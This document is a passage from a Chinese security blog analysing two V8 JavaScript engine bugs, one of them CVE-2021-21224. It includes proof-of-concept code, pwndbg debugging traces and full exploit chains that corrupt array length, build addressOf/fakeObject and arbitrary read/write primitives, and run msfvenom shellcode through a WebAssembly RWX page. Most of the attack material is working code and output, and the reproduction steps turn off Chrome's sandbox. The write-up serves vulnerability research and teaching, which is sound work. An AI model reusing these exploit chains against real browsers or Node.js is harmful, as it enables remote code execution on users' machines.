&lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123;&#125; - elements: 0x04e608088511 &lt;ByteArray[4]&gt; &#123;           0: 2147483648 &#125; - embedder fields = &#123;    0, aligned pointer: (nil)    0, aligned pointer: (nil) &#125;0x4e608243109: [Map] - type: JS_TYPED_ARRAY_TYPE - instance size: 68 - inobject properties: 0 - elements kind: UINT32ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x04e6080423b5 &lt;undefined&gt; - prototype_validity cell: 0x04e608182405 &lt;Cell value= 1&gt; - instance descriptors (own) #0: 0x04e6080421c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt; - prototype: 0x04e608209815 &lt;Object map = 0x4e608243131&gt; - constructor: 0x04e60820979d &lt;JSFunction Uint32Array (sfi = 0x4e608189721)&gt; - dependent code: 0x04e608212aed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0...pwndbg&gt; x/wx 0x04e608088511-1+80x4e608088518:  0x80000000pwndbg&gt; rwatch *(int*)0x04e608088518Hardware read watchpoint 1: *(int*)0x04e60808851\n\n验证静态分析结果\npwndbg&gt; cContinuing.Thread 1 &quot;d8&quot; hit Hardware read watchpoint 1: *(int*)0x04e608088518Value = -21474836480x000004e6001c4330 in ?? ()ERROR: Could not find ELF base!LEGND: STACK | HEAP | CODE | DATA | RWX | RODATA──────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────── RAX  0x0*RBX  0x4e608212ac9 ◂— 0x8080423b508042a*RCX  0x80000000...──────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────── ► 0x4e6001c4330    add    rcx, 1   0x4e6001c4334    mov    edi, ecx   0x4e6001c4336    movsxd r8, ecx   0x4e6001c4339    cmp    r8, rcx   0x4e6001c433c    jne    0x4e6001c4394 &lt;0x4e6001c4394&gt;    ↓   0x4e6001c4394    movabs rdi, 0x5626663c8c48   0x4e6001c439e    mov    r8, qword ptr [rdi]   0x4e6001c43a1    lea    r9, [r8 + 0xc]   0x4e6001c43a5    mov    qword ptr [rbp - 0x20], rcx   0x4e6001c43a9    movabs r11, 0x5626663c8c50   0x4e6001c43b3    cmp    qword ptr [r11], r9...pwndbg&gt; si0x000004e6001c4334 in ?? ()ERROR: Could not find ELF base!LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA──────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────── RAX  0x0 RBX  0x4e608212ac9 ◂— 0x8080423b508042a*RCX  0x80000001...──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────   0x4e6001c4330    add    rcx, 1 ► 0x4e6001c4334    mov    edi, ecx   0x4e6001c4336    movsxd r8, ecx   0x4e6001c4339    cmp    r8, rcx   0x4e6001c433c    jne    0x4e6001c4394 &lt;0x4e6001c4394&gt;    ↓   0x4e6001c4394    movabs rdi, 0x5626663c8c48   0x4e6001c439e    mov    r8, qword ptr [rdi]   0x4e6001c43a1    lea    r9, [r8 + 0xc]   0x4e6001c43a5    mov    qword ptr [rbp - 0x20], rcx   0x4e6001c43a9    movabs r11, 0x5626663c8c50   0x4e6001c43b3    cmp    qword ptr [r11], r9...pwndbg&gt; x/5i 0x4e6001c432b   0x4e6001c432b:       add    rcx,r8   0x4e6001c432e:       mov    ecx,DWORD PTR [rcx]   0x4e6001c4330:       add    rcx,0x1=&gt; 0x4e6001c4334:       mov    edi,ecx   0x4e6001c4336:       movsxd r8,ecx\n\n观察到在执行完0x4e6001c432e处指令后，RCX 的值为 0x80000000，并没有进行有符号拓展，而执行完0x4e6001c4330后，RCX 的值为 0x80000001，验证了我们得到的结果。\n（4）EXP构造（1）构造超长数组从ChangeInt32ToInt64到将数组长度设置为-1，需要用到一种针对于JIT常用的利用技术：typer bug[6]，简单的理解就是在JavaScript函数的前几次调用期间，解释器记录各种操作的类型信息，例如参数访问和属性加载。如果以后选择该函数进行JIT编译，则V8的最新编译器TurboFan会假定在所有后续调用中都将使用观察到的类型，并使用从解释器中得出的规则集将类型信息传播到JIT。\n我们将poc构造如下\nfunction foo(a) &#123;    var x = 1;\tx = (_arr[0] ^ 0) + 1;\tx = Math.abs(x);\tx -= 2147483647;\t\t\tx = Math.max(x, 0);\t\t\t// predicted = 0; actual = 2\tx -= 1;\t\t\t\t\t   // predicted = -1; actual = 1\tif(x==-1) x = 0;\t\t\t// predicted = 0; actual = 1\t\t\t\tvar arr = new Array(x);\t\t// predicted = 0; actual = 1\tarr.shift();\t\t\t\t// predicted = 0; actual = -1，这里是比较难以理解的部分，之前解释器在处理shift的时候判断x的值为0，正常执行，所以在JIT阶段优化掉了边界检查；而在JIT阶段x==1，此时JIT仍将x的值当作0，由于x实际为1，所以shift将对数组长度做减一操作，再由于此时JIT将x的值当作0，所以最终数组的长度为0-1 == -1，这样构造出了超长的数组，可以进行很高的相对地址读写权限。\tvar cor = [1.1, 1.2, 1.3];\treturn [arr, cor];&#125;var x = foo(false);for(var i=0;i&lt;0x30000;++i)    foo(true);var x = foo(false);print(x[0].length);%DebugPrint(x[0]);                    %SystemBreak();                                \n\n在LoadElimination阶段，可以看到将-1存储到#185 StoreElement，并传递给#184 StoreField 之后继续传递到#192 EffedtPhi，而调用#190 ArrayShift也会经由#192 EffectPhi处理得到的参数。\n\n调试验证结果\npwndbg&gt; r-1DebugPrint: 0x351f0833dd31: [JSArray] - map: 0x351f082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x351f0820b959 &lt;JSArray[0]&gt; - elements: 0x351f0833dd25 &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS]\t\t\t\t;可见构建了超长数组：FixedArray[67244566] - length: -1 - properties: 0x351f0804222d &lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123;    0x351f080446c1: [String] in ReadOnlySpace: #length: 0x351f0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor &#125; - elements: 0x351f0833dd25 &lt;FixedArray[67244566]&gt; &#123;           0: 0x351f0804242d &lt;the_hole&gt;           1: 0x351f082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;           2: 0x351f0804222d &lt;FixedArray[0]&gt;           3: 0x351f0833dd25 &lt;FixedArray[67244566]&gt;           4: -1           5: 0x351f08042a95 &lt;Map&gt;           6: 3           7: -858993459...pwndbg&gt; x/10wx 0x351f0833dd240x351f0833dd24: 0x08042205      0x0804242d      0x0804242d      0x082439c90x351f0833dd34: 0x0804222d      0x0833dd25      0xfffffffe      0x08042a95\t\t\t;0xfffffffe为-1，0x351f0833dd44: 0x00000006      0x9999999\n\n（2）addressOf和fakeObject实现之后确定arr和cor的偏移，方便通过对arr的相对地址读写进行addressOf和fakeObject的实现。\nvar arr = x[0];var cor = x[1];const idx = 6;//arr[idx+11] = 0x4242;  arr[idx+10] = 0x2333;                           //arr[idx+10]位置处存放cor的length属性，在这里可以将cor的长度扩展造成相对地址读写。function addressOf(k) &#123;    arr[idx+1] = k;    return f2big(cor[0]) &amp; 0xffffffffn;         //由于只有Array对象有shift方法，而Array对象的每个元素为四字节，我们只能泄露低四字节的地址（不排除有一些我不清楚的方法可以泄露八字节）,而这里的八字节因为前四字节已经被位运算清零了。实际上这里需要的也仅仅是四字节读写的能力，引擎会自动填充前面的基址。&#125;function fakeObject(k) &#123;    cor[0] = big2f(k);    return arr[idx+1];                          //返回的也只是低四字节&#125;var test = [1.1,2.2,3.3];test_addr = addressOf(test);console.log(test_addr);%DebugPrint(test);\t\t\t%SystemBreak();\t\n\n简单介绍下上述代码，arr[idx+10]为cor的length属性，可以直接修改该值为大于原长度的值，这样cor数组也可以进行越界读写了，cor与arr的区别在于cor的相对读写可以操作八个字节。然后是addressOf与fakeObject原语的构造，在这里，由于arr和cor可以通过不同的索引值访问相同的空间，这样通过不同类型的数组读取出来的值的类型是不一样的（元素靠数组的map来确定类型），这样很容易就可以实现类型混淆。前面确定了cor与arr的内存相对偏移，便可以进行addressOf和fakeObject的实现。\n调试来验证结果\npwndbg&gt; r000000000811d8b9DebugPrint: 0x19b00811d8b9: [JSArray] - map: 0x19b0082439f1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties] - prototype: 0x19b00820b959 &lt;JSArray[0]&gt; - elements: 0x19b00811d8d1 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS] - length: 3 - properties: 0x19b00804222d &lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123;    0x19b0080446c1: [String] in ReadOnlySpace: #length: 0x19b00818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor &#125; - elements: 0x19b00811d8d1 &lt;FixedDoubleArray[3]&gt; &#123;           0: 1.1           1: 2.2           2: 3.3 &#125;\n\n（3）任意读写原语实现相关代码如下\nvar float_array_map = f2big(cor[3]);              var arr2 = [big2f(float_array_map), 1.2, 2.3, 3.4];         //创建伪造对象的数组var fake = fakeObject(addressOf(arr2) + 0x20n);             //通过fakeObject伪造对象function arbread(addr) &#123;    if (addr % 2n == 0)         addr += 1n;    arr2[1] = big2f((2n &lt;&lt; 32n) + addr - 8n);               //创建伪造对象的数组，这里arr2[0] == fake_map, arr2[1] == arr2_length+elements_addr；2n &lt;&lt; 32n代表arr2的长度。大于等于2即可。    return (fake[0]);                                       //将addr2的内存构造为：前四字节为伪造的对象的长度，后四字节为要读取信息的地址。，fake[0]相当于那个修改任意地址的指针。&#125;function arbwrite(addr, val) &#123;    if (addr % 2n == 0)         addr += 1n;    arr2[1] = big2f((2n &lt;&lt; 32n) + addr - 8n);    fake[0] = big2f(BigInt(val));                           &#125;\n\n具体相关的点都已经在代码注释中标注出来了，唯一需要注意的可能就是arr2[1]和fake[0]的换算关系如何得出，这个可以通过下面的内存状态尝试理解并编写相应的原语。\n00:0000│  0x1fa7082aaea0 ◂— 0x804222d082439f1\t\t\t\t; arr_map01:0008│  0x1fa7082aaea8 ◂— 0x8082aaeb9\t\t\t\t\t    ; arr_length + arr_elements_addr02:0010│  0x1fa7082aaeb0 ◂— 0x8213bc5080455b9\t\t\t\t03:0018│  0x1fa7082aaeb8 ◂— 0x808042a95\t\t\t\t\t    ; arr_elements_map\t\t\t04:0020│  0x1fa7082aaec0 ◂— 0x804222d082439f1\t\t\t\t;fake_map\t\t\t\t\t\t\t\tarr2[0]05:0028│  0x1fa7082aaec8 ◂— 0x3ff3333333333333\t\t\t\t;fake_length + fake_element_addr\t\t  arr2[1]06:0030│  0x1fa7082aaed0 ◂— 0x4002666666666666\t\t\t\t07:0038│  0x1fa7082aaed8 ◂— 0x400b333333333333 (&#x27;333333\\x0b@&#x27;)\n\n个人对上述的推理过程如下：\n[0x28] == (2n &lt;&lt; 32n) + addr - 8n\narr2[1]  -&gt; [0x0+0x8]+0x8+0x8 -&gt; 0x18+0x8+0x8 -&gt; 0x28\nfake[0] -&gt; [0x20+0x8]+0x8 -&gt;  (2n &lt;&lt; 32n) + addr - 8n+0x8 -&gt; (2n &lt;&lt; 32n) + addr\n这样就可以通过操作fake[0]来进行任意地址读写。\n(4)wasm利用这里就是因为wasm会生成一块rwx空间，通过向该空间写入shellcode并调用达到命令执行的目的。\n代码如下\n//msfvenom -p linux/x64/exec CMD=whoami -f numlet shellcode = [0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x07, 0x00, 0x00, 0x00, 0x77, 0x68, 0x6f, 0x61, 0x6d, 0x69, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05];var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var f = wasmInstance.exports.main;let buf2 = new ArrayBuffer(0x150);function copy_shellcode(addr, shellcode) &#123;    let dataview = new DataView(buf2);    let buf_addr = addressOf(buf2);    let backing_store_addr = buf_addr + 0x14n;    arbwrite(backing_store_addr, addr);    for (let i = 0; i &lt; shellcode.length; i++) &#123;        dataview.setUint8(i, shellcode[i]);    &#125;&#125;var rwx_page_addr = f2big(arbread(addressOf(wasmInstance) + 0x68n));                console.log(&quot;[+] Address of rwx page: &quot; + rwx_page_addr.toString(16));copy_shellcode(rwx_page_addr, shellcode);f();\n\n最终复现如下\n\n3、漏洞修复issue 1196683\n四、总结与思考该漏洞分析是个人的第一个Chrome的真实漏洞分析，所以过程会比较详细，但是详细不意味着面面俱到。我始终相信，二进制漏洞分析真实的调试一定是必不可少的，我想要表达的一些东西都存在于调试信息中了，自然就没有必要进行过多的文字陈述。\n由于JIT优化机制的存在，出现类似于这种类型的漏洞一定还是存在的，但是这种漏洞是无法绕过沙箱的，所以用户开启沙箱使用浏览器可以在很大程度上防止恶意代码的攻击，但仍有一些漏洞是可以绕过沙箱对宿主机进行攻击，这就需要我们对不明链接保持谨慎的习惯，这样就可以很好的避免0day浏览器漏洞对我们的损害。\n该文章的成型参考了很多篇优秀的文章[123]，感谢师傅们的开源精神，我也会将更多我的漏洞分析过程公开出来，为技术分享的氛围贡献一点绵薄之力。\n五、参考[1]. https://mp.weixin.qq.com/s/O81Kw-ujcbjY_1S6dFKpxQ\n[2]. https://github.com/r4j0x00/exploits/tree/master/chrome-0day\n[3]. https://mp.weixin.qq.com/s/yeu9IZSNrp1f_lK5oIdL9A\n[4]. https://www.ecma-international.org/publications-and-standards/standards/ecma-262/\n[5]. https://v8.dev/blog/elements-kinds\n[6]. https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html\n[7]. https://bugs.chromium.org/p/v8/issues/detail?id=6380\n[8]. https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html\n[9]. https://v8.dev/blog/pointer-compression\n"},{"title":"CVE-2021-21224","url":"/2021/05/12/CVE-2021-21224/","content":"V8远程代码执行漏洞一、漏洞信息1、漏洞简述\n漏洞名称：V8远程代码执行漏洞\n漏洞编号：CVE-2021-21224\n漏洞类型：JIT优化导致可构造超长数组进行任意地址读写\n漏洞影响：远程代码执行\nCVSS3.0：N/A\nCVSS2.0：N/A\n漏洞危害等级：严重\n\n2、组件和漏洞概述V8是Google使用C++编写的开源高性能JavaScript和WebAssembly引擎。它被广泛用于用于Chrome和Node.js等场景中。它实现了ECMAScript和WebAssembly功能。V8既可以在Windows 7及以上版本，macOS 10.12+和使用x64，IA-32，ARM或MIPS处理器的Linux等操作系统上运行。也可以独立运行，还可以嵌入到任何C ++应用程序中。\n3、相关链接issue 1195777\nhttps://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html\n4、解决方案https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html\n二、漏洞复现1、环境搭建安装89.0.4389.90的Chrome浏览器\n2、复现过程1、在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。\n2、将漏洞文件拖入浏览器中执行\n\n三、漏洞分析1、基本信息\n漏洞文件：representation-change.cc\n漏洞函数：RepresentationChanger::GetWord32RepresentationFor\n\n2、补丁对比观察v8修复漏洞详情，可以看到，在调用 TruncateInt64ToInt32 函数之前增加了一项检查，检查了当 output_type 为 Type::Unsigned32 时，user_info的类型是否为 TypeCheckKind::kNone。\n\n3、漏洞分析（1）POC分析function foo(a) &#123;                                                              let x = -1;        if (a) x = 0xFFFFFFFF;        var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));        arr.shift();    &#125;    for (var i = 0; i &lt; 0x10000; ++i)        foo(false);                                   foo(true);\n\n分析下poc，在循环执行foo(false)函数时，Ignation会收集类型反馈并进行投机优化，交由TurboFan处理，此时最大值始终为0，最终会得到一个长度为0的数组，经由shift处理时，长度仍然为0；\n最后执行foo(true)时，x值变为0XFFFFFFFF，当执行创建数组的操作时，执行了TruncateInt64ToInt32函数直接进行截断，而未进行类型检查，导致x被当作-1进行操作，此时创造了TurboFan意料之外的数据范围1，最终执行shift函数时创造了长度为-1的数组。\n（2）执行流分析在EscapeAnalysis阶段，程序的执行流按照我们所看到的那样，通过max函数确定函数的范围为（0，4294967295），经过sub操作后范围为（-4294967295，0），最后进行sign运算，得到的范围为（-1，0），最终进行边界检查，得到范围为（0，0）\n\n而在SimplifiedLowering阶段，在select数据范围之后，调用了TruncateInt64ToInt32，最终在CheckedUint32Bounds得到的数据范围为Range（0，0）.\n\n（3）动态验证调试v8，发现执行到 RepresentationChanger::GetWord32RepresentationFor 函数处理 output_rep 为  MachineRepresentation::kWord64 时的逻辑如下，此时的use_info的类型为 kSignedSmall 类型，由于该处并未对use_info执行检查，导致opcode为 TruncateInt64ToInt32 。\n\n而当对漏洞代码进行修复后，则会执行CheckedUint64ToInt32或CheckedInt64ToInt32函数来对output_rep进行处理。\n\n修复漏洞后的执行流程如下，此时确实调用了CheckedInt64ToInt32函数对操作数进行了处理\n\n（4）EXP构造公开exp的构造方式并非为传统的构造addressOf和fakeObject原语以及任意读写原语，而是通过DataView对象直接操作漏洞bufffer进行任意读写。\n（1）构造超长数组根据上面的分析，可以得到一个长度为-1的超长的数组，下面是定义的gadget代码以及得到长度为-1数组的代码，代码中LeakArrayBuffer继承于ArrayBuffer，重写的LeakArrayBuffer与ArrayBuffer不同的地方在于定义了一个变量slot，定义该变量的目的就是为了通过类型混淆达到相对地址读的作用。\nfunction hex(i) &#123;    return (&quot;0x&quot;+i.toString(16));    &#125; function gc() &#123;        for (var i = 0; i &lt; 0x80000; ++i) &#123;            var a = new ArrayBuffer();        &#125;    &#125; class LeakArrayBuffer extends ArrayBuffer &#123;        constructor(size) &#123;            super(size);                                                        //super()相当与父类call，其实就是实现父类原有的功能，这里的super就是生成大小为size的缓冲区。            this.slot = 0xb33f;                                                 //定义了一个变量slot，        &#125;    &#125; function foo(a) &#123;                                                              let x = -1;        if (a) x = 0xFFFFFFFF;        //console.log(x);            var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));        arr.shift();        //console.log(arr.length);        let local_arr = Array(2);        local_arr[0] = 5.1;//4014666666666666        let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8        arr[0] = 0x1122;        return [arr, local_arr, buff];    &#125;    for (var i = 0; i &lt; 0x10000; ++i)        foo(false);                                   [corrupt_arr, rwarr, corrupt_buff] = foo(true);    console.log(corrupt_arr.length);    %DebugPrint(corrupt_arr);    %SystemBreak();\n\n执行结果如下，从下面的执行结果可以看出corrupt_arr数组的长度为-1，并且打印出了corrupt_arr参数地址以及第0-17元素的值：\nroot@ubuntu:~/v8/v8/out/x64.release# ./d8 test1.js --allow-natives-syntax-1DebugPrint: 0x11930809ca05: [JSArray] - map: 0x1193082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x11930820b959 &lt;JSArray[0]&gt; - elements: 0x11930809c9f9 &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS] - length: -1 - properties: 0x11930804222d &lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123;    0x1193080446c1: [String] in ReadOnlySpace: #length: 0x11930818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor &#125; - elements: 0x11930809c9f9 &lt;FixedArray[67244566]&gt; &#123;           0: 4386           1: 0x1193082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;           2: 0x11930804222d &lt;FixedArray[0]&gt;           3: 0x11930809c9f9 &lt;FixedArray[67244566]&gt;           4: -1           5: 0x119308042205 &lt;Map&gt;           6: 2         7-8: 0x11930804242d &lt;the_hole&gt;           9: 0x119308243a19 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;          10: 0x11930804222d &lt;FixedArray[0]&gt;          11: 0x11930809ca39 &lt;FixedDoubleArray[2]&gt;          12: 2          13: 0x1193080422c5 &lt;Map[4]&gt;          14: 0x119308042a95 &lt;Map&gt;          15: 2          16: 858993459          17: 537539379Received signal 11 SEGV_ACCERR 1193fff7fffc==== C stack trace =============================== [0x55d5d79b7b57] [0x7f2be3f1c980] [0x55d5d717ff59] [0x55d5d717fc77] [0x55d5d6eece05] [0x55d5d6eeb455] [0x55d5d6eeeecd] [0x55d5d6ee718d] [0x55d5d6edd188] [0x55d5d6edc522] [0x55d5d72fd95e] [0x55d5d72f177e] [0x1193000b2213][end of stack trace]段错误 (核心已转储)root@ubuntu:~/v8/v8/out/x64.release#\n\n（2）构建恶意DataView对象进行漏洞利用这一步是这个漏洞利用比较精妙的部分了，首先通过查看内存获取corrupt_arr与rwarr的偏移量（调试信息中，上面的是rwarr的内存，下面的是corrupt_arr的内存，由于corrupt_arr的数组已经损坏，所以将corrupt_arr放在上面读取信息时会出错）\nroot@ubuntu:~/v8/v8/out/x64.release# ./d8 test1.js --allow-natives-syntax-1DebugPrint: 0xda708098035: [JSArray] - map: 0x0da708243a19 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt; [FastProperties] - prototype: 0x0da70820b959 &lt;JSArray[0]&gt; - elements: 0x0da708098049 &lt;FixedDoubleArray[2]&gt; [HOLEY_DOUBLE_ELEMENTS] - length: 2 - properties: 0x0da70804222d &lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123;    0xda7080446c1: [String] in ReadOnlySpace: #length: 0x0da70818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor &#125; - elements: 0x0da708098049 &lt;FixedDoubleArray[2]&gt; &#123;           0: 5.1           1: &lt;the_hole&gt; &#125;...DebugPrint: 0xda708098015: [JSArray] - map: 0x0da7082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x0da70820b959 &lt;JSArray[0]&gt; - elements: 0x0da708098009 &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS] - length: -1 - properties: 0x0da70804222d &lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123;    0xda7080446c1: [String] in ReadOnlySpace: #length: 0x0da70818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor &#125; - elements: 0x0da708098009 &lt;FixedArray[67244566]&gt; &#123;           0: 4386           1: 0x0da7082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;           2: 0x0da70804222d &lt;FixedArray[0]&gt;           3: 0x0da708098009 &lt;FixedArray[67244566]&gt;           4: -1           5: 0x0da708042205 &lt;Map&gt;           6: 2         7-8: 0x0da70804242d &lt;the_hole&gt;           9: 0x0da708243a19 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;          10: 0x0da70804222d &lt;FixedArray[0]&gt;          11: 0x0da708098049 &lt;FixedDoubleArray[2]&gt;          12: 2          13: 0x0da7080422c5 &lt;Map[4]&gt;          14: 0x0da708042a95 &lt;Map&gt;          15: 2          16: 858993459          17: 537539379Received signal 11 SEGV_ACCERR 0da7fff7fffc...\n\n由上面的结果可以推算出(0xda708098035-0x0da708098009)/4 -&gt; 0x2c/4 -&gt; 11，所以corrupt_arr偏移11的位置为rwarr的map，那么corrupt_arr偏移12的位置处为rwarr的length（具体内存结构可以通过动态调试来获取）。\n那么我们修改rwarr的length语句则为，之后销毁那个被损坏的数组对象\ncorrupt_arr[12] = 0x22444;delete corrupt_arr;  \n\n之后我们的相对内存读写通过这个未被损坏的数组进行操作。接下来构造两个函数，实现如下\nfunction setbackingStore(hi, low) &#123;    rwarr[4] = i2f(f2i(rwarr[4]), hi);    rwarr[5] = i2f(low, f4i(rwarr[5]));              //给corrupt_buff的backing_store属性赋值，backing_store：0xb7080d6fc4（8位）、rwarr[4]：0xb7080d6fc0（8位）、rwarr[5]：0xb7080d6fc8（8位）&#125; function leakObjLow(o) &#123;    corrupt_buff.slot = o;    return (f2i(rwarr[9]) - 1);                      //因为采用了地址压缩，所以当前内存中只存取了低四字节地址。&#125;\n\nleakObjLow主要是为了泄露低地址的值，由于采用了地址压缩，所以当前内存中只存取了低四字节地址。内存如下（rwarr[9]为slot的内存，rwarr[4]的高地址和rwarr[5]的低地址为corrupt_buff的backing_store属性值，通过恶意DataView对象对backing_store进行操作，即可完成任意地址读写）\npwndbg&gt; telescope 0x0766080e8099-1 \t\t\t\t\trwarr_addr00:0000│  0x766080e8098 ◂— 0x408042a9501:0008│  0x766080e80a0 ◂— 0x4014666666666666\t\t\trwarr[0]02:0010│  0x766080e80a8 ◂— 0xfff7fffffff7ffff03:0018│  0x766080e80b0 ◂— 0x804222d0824723104:0020│  0x766080e80b8 ◂— 0x10000804222d05:0028│  0x766080e80c0 ◂— 0xec3bfdf000000000\t\t\trwarr[4]\t06:0030│  0x766080e80c8 ◂— 0xec3bfdc0000055fd\t\t\trwarr[5]07:0038│  0x766080e80d0 ◂— 0x2000055fdpwndbg&gt; telescope 0x766080e80b1-1 \t\t\t\t\tcorrupt_buff_addr00:0000│  0x766080e80b0 ◂— 0x804222d0824723101:0008│  0x766080e80b8 ◂— 0x10000804222d02:0010│  0x766080e80c0 ◂— 0xec3bfdf00000000003:0018│  0x766080e80c8 ◂— 0xec3bfdc0000055fd\t\t\t04:0020│  0x766080e80d0 ◂— 0x2000055fd05:0028│  0x766080e80d8 ◂— 0x006:0030│  0x766080e80e0 ◂— 0x007:0038│  0x766080e80e8 ◂— 0x80422050001667e\t\trwarr[9]08:0040│  0x766080e80f0 ◂— 0x80e806500000006─pwndbg&gt; job 0x766080e80b1       18-19: [weak] 0x0766fff7fffd 0x766080e80b1: [JSArrayBuffer] - map: 0x076608247231 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x07660818cb45 &lt;LeakArrayBuffer map = 0x76608247209&gt; - elements: 0x07660804222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - embedder fields: 2 - backing_store: 0x55fdec3bfdf0 - byte_length: 4096 - detachable - properties: 0x07660804222d &lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123;    0x76608212b89: [String] in OldSpace: #slot: 45887 (const data field 0), location: in-object &#125; - embedder fields = &#123;    0, aligned pointer: (nil)    0, aligned pointer: (nil) &#125;\n\n不过到目前为止我们只获得了低四位的地址，并不能进行绝对地址写，我们需要获得当前空间的高四位基址，可以通过以下的代码进行实现，最终得到的this.base为基址。\n//这里采用了地址压缩，定位基址的采用了通过rwarr访问baseAddr的方式   let corrupt_view = new DataView(corrupt_buff);                  //通过corrupt_view操作corrupt_buff的backing_store属性进行任意地址读写。   let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);                         //corrupt_buffer_ptr： 0x103082f18a1 ，corrupt_buffer_ptr_low： 0x82f18a0   let idx0Addr = corrupt_buffer_ptr_low - 0x10;                                                                               //rwarr[0]的位置： 0x82f1890   let baseAddr = (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;         //获得基址： 0x8300000   0x82f0000-0x30000+0x40000       let delta = baseAddr + 0x1c - idx0Addr;                       //0xe78c  ,rwarr[0]距离目标的实际大小   if ((delta % 8) == 0) &#123;       let baseIdx = delta / 8;       this.base = f2i(rwarr[baseIdx]);   &#125; else &#123;       let baseIdx = ((delta - (delta % 8)) / 8);                //0x1cf1       this.base = f4i(rwarr[baseIdx]);                          //0x103   &#125;\n\n最终可以通过setbackingStore操作地址进行任意地址读写，泄露出rwx地址并写入shellcode，最终执行shellcode\nlet wasmInsAddr = leakObjLow(wasmInstance);    setbackingStore(wasmInsAddr, this.base);                           let rwx_page_addr = corrupt_view.getFloat64(0x68, true);      //获得rwx_page_addr,在偏移0x68的位置上    setbackingStore(f2i(rwx_page_addr), f4i(rwx_page_addr));    for (let i = 0; i &lt; shellcode.length; i++) &#123;        corrupt_view.setUint8(i, shellcode[i]);    &#125;    f();\n\n使用的shellcode如下\n//msfvenom -p linux/x64/exec CMD=&quot;echo pwn&quot; -f num exitfunc=thread -a x64    let shellcode = [0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x09, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x70, 0x77, 0x6e, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05];\n\n最终复现结果如下\n\n3、漏洞修复issue 1195777\nhttps://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop_20.html\n四、总结与思考该漏洞为CVE-2021-21220的exp公开不久后公布的，是2021HW中的两枚重磅炸弹，虽然都不可以进行沙箱逃逸，但是仍然可以在一些不开启沙箱的情况下进行使用。该公开的exp的利用手法比较巧妙，通过corrupt_arr修改rwarr数组长度，rwarr具有八字节读写能力，之后通过rwarr相对地址读写可以操作corrupt_buff进而造成任意地址读写\n五、参考[1]. http://noahblog.360.cn/chromium_v8_remote_code_execution_vulnerability_analysis/\n[2]. 